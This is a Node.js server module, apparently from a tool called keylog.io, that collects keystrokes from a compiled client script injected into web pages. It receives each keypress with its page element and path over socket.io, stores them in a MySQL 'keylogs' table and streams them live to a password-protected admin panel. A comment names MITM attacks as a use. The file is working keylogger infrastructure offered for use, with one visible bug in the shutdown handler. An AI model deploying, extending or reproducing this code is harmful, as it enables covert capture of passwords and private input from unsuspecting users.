'use strict';

const http = require('http');
const path = require('path');
const compression = require('compression')
const express = require('express');
const basicAuth = require('express-basic-auth');
const bodyParser = require('body-parser');
const mysql = require('mysql');
const moment = require('moment');
const async = require('async');
const ora = require('ora');
const open = require('opn');
const app = express();

// Script default settings for keylogger and database integration
const defaults = require('./config');

// Like object assign but avoid undefined
function assignDefined(target, ...sources) {
  for (const source of sources) {
    for (const key of Object.keys(source)) {
      const val = source[key];
      if (val !== undefined) {
        target[key] = typeof val === 'object' ?
          assignDefined(target[key] || {}, val) :
          val;
      }
    }
  }
  return target;
}

module.exports = function(options) {
  let conn = null;

  const spinner = ora({
    text: '[K]eylog.io is starting.\n',
    hideCursor: true
  }).stopAndPersist({symbol: '♥'});

  // Init the http server with express handler
  const server = http.Server(app);

  // Copy the original execution options before they
  // get merged with the detauls and possibly extended
  const execOpts = Object.assign({}, options);

  // Extend default options with user supplied
  options = assignDefined({}, defaults, options);

  // Admin interface root page
  const address = `http://${options.hostname}:${options.port}`;

  async.series({
    connectDB: next => {
      // Since the options was merged and we can't say from
      // the extended options if the database property was selected
      // by user, refef to the original values to check if enable db
      if (!execOpts.database || !execOpts.database.hostname) {
        return next(null, false);
      }

      // Create MySQL client
      conn = mysql.createConnection({
        host: options.database.hostname,
        user: options.database.username,
        password: options.database.password,
        database: options.database.name,
        debug: options.database.debug
      });

      spinner.color = 'yellow';
      spinner.start('Testing database connection.');
      async.series({
        testConnection: cb => conn.query('SELECT 1', cb),
        setupTable: cb => {
          spinner.text = 'Running database table setup.';
          const createTableQuery = `
            CREATE TABLE IF NOT EXISTS \`keylogs\` (
              \`id\` int(11) NOT NULL AUTO_INCREMENT,
              \`hostname\` varchar(50) NOT NULL,
              \`element\` varchar(50) NOT NULL,
              \`key\` varchar(50) NOT NULL,
              \`path\` varchar(255) NOT NULL,
              \`timestamp\` timestamp NOT NULL DEFAULT current_timestamp(),
              KEY (\`id\`),
              INDEX \`HOSTNAME_INDEX\` (\`hostname\`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
          `
          conn.query(createTableQuery, (err, results) => {
            if (err) return cb(err)
            if (results.warningCount) {
              spinner.color = 'yellow';
              spinner.text = 'Table already exists.';
            } else {
              spinner.text = 'Created keylogs table and indexes.'
            }
            next(null, true);
          });
        }
      }, (err, resp) => {
        if (err) {
          conn = null;
          spinner.warn(`Failed to initializate the database.`);
          spinner.warn(err.message + '\n');
          return next(null, false);
        }

        const dbName = options.database.name;
        spinner.succeed(`Successfully connected to ${dbName} db.\n`);
        next(null, dbName);
      });
    },
    serveDemo: next => {
      if (!options.serveDemo) {
        return next(null, false);
      }

      // Force the client file to be served since the demo depends on it
      options.serveClient = true;

      // Serve the demo page through express
      spinner.start('Preparing the demo files.');
      app.use('/demo', express.static(path.join(__dirname, 'demo')));
      next(null, '/demo');
    },
    serveClient: next => {
      if (!options.serveClient) {
        return next(null, false);
      }

      // Extend default config because client file needs this variable
      const webpack = require("webpack");
      const webpackConfig = require('./webpack.config.js');
      webpackConfig.plugins.unshift(new webpack.DefinePlugin({
        SERVER_URL: JSON.stringify(address)
      }))

      // Compile the client script with the new endpoint
      spinner.start('Compiling the client script.');
      webpack(webpackConfig, (err, stats) => {
        if (err) {
          spinner.fail('The build of the client file failed.');
          if (err.details) {
            spinner.fail(err.details);
          }
          return next(null, false);;
        }

        // Serve the client script through express
        spinner.text = 'Client script compiled successfully.';
        app.get('/client.min.js', function (req, res) {
          res.sendFile(path.join(__dirname, '../dist/bundle.min.js'));
        });
        next(null, '/client.min.js');
      });
    },
    setupSocket: next => {
      const io = require('socket.io')(server, {
        serveClient: false,
        cookie: false
      });

      // Administrator private namespace
      const admin = io.of('/admin');

      spinner.start('Configuring the socket server.');

      // When a client connects all the keypress events are forwarded
      // to the administrator namespace which is dedicated to the interface
      io.on('connection', function (socket) {
        // When new users connect or disconnect update the number of connected
        // sockets that is displayed on the admin interface, useful to know
        // if the program is working in case of MITM attacks
        admin.emit('clients', Object.keys(io.sockets.connected))
        socket.on('disconnect', () => {
          admin.emit('clients', Object.keys(io.sockets.connected))
        })

        // Listen for keylogs
        socket.on('keypress', (data) => {
          // Optionally save the keypresses to MySQL database
          // since the interface supports an archive mode for searching through
          // the keylog recording history this can be really useful
          if (conn && conn.state !== 'disconnected') {
            let mysqlData = Object.assign({}, data);
            mysqlData.timestamp = moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')
            conn.query('INSERT INTO keylogs SET ?', mysqlData, function (error, results, fields) {
              if (error) {
                console.log('Error while saving keylog event to database:\n', error);
              }
            });
          }

          // Forward all the keylogs to the administrator namespace
          admin.emit('keylog', data);
        });
      });

      next(null, true);
    },
    setupServer: next => {
      app.use(bodyParser.json());
      app.use(compression());

      // Add the api routes that depends on MySQL database
      if (conn) {
        app.locals.conn = conn;
        app.use('/api', (req, res, next) => {
          res.setHeader('Access-Control-Allow-Origin', '*');
          res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
          next();
        }, require('./router'));
      }

      // Serve all the static files for administration interface
      app.use(express.static(path.join(__dirname, '/../dist')));

      // Basic HTTé Authorization handler
      const authorizationFunction = basicAuth({
        challenge: true,
        users: { [`${options.username}`]: options.password }
      });

      // Serve the keylog.io administration panel index
      app.get('*', authorizationFunction, (req, res) => {
        res.sendFile(path.join(__dirname, '/../dist/index.html'));
      });

      // Start express socket server
      spinner.start('Starting http server.');
      server.listen(options.port, '0.0.0.0', () => {
        next(null, {
          local: `http://localhost:${options.port}`,
          public: address
        });
      }).on('error', next);
    }
  }, (err, results) => {
    if (err) {
      spinner.fail('Something went wrong:\n', err);
      process.exit(err);
      return;
    }

    let cp;

    spinner.succeed('Server running at:');
    console.log('  - Local address:'.padEnd(20), results.setupServer.local);
    console.log('  - Public address:'.padEnd(20), results.setupServer.public, '\n');

    if (results.serveClient) {
      let nl = results.serveDemo ? '' : '\n';
      spinner.info(`The CLIENT script is available at: ${results.serveClient} ${nl}`);
    }

    if (results.serveDemo) {
      spinner.info(`The DEMO page can be accessed at: ${results.serveDemo}\n`);
    }

    // Open the admin interface using system default browser
    if (options.open) {
      spinner.info('A web browser page should open is seconds.');
      spinner.info('If something fails, please visit the url manually.\n');
      cp = open(address);
    }

    spinner.info('Press [ctrl+c] at anytime to stop the server.\n');
    spinner.color = 'white';
    spinner.start('Waiting for clients connections... \n');

    function gracefulShutdown() {
      spinner.succeed('The server has been closed correctly.\n');
      console.log('★ Thank you for using our products.\n')
      process.exit(0);
    }

    function exitHandler() {
      spinner.color = 'yellow';
      spinner.start('Closing the server, wait a second.\n');

      if (conn) {
        connection.end(function(err) {
          spinner.start('Closed database connection.\n');
          console.log('err', err);
          gracefulShutdown()
        });
      } else {
        gracefulShutdown()
      }
    }

    process.on('SIGINT', exitHandler);
    process.on('SIGUSR1', exitHandler);
    process.on('SIGUSR2', exitHandler);
  });
};
